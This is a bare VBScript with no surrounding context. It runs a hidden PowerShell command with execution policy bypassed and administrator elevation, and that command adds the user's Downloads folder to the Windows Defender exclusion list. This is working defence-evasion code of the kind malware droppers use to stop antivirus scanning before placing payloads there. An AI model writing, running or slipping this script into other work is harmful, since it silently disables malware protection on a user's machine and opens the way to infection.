Set shell = CreateObject("WScript.Shell")
command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '$env:USERPROFILE\Downloads'"""
shell.Run "runas /user:Administrator " & Chr(34) & command & Chr(34), 1, false
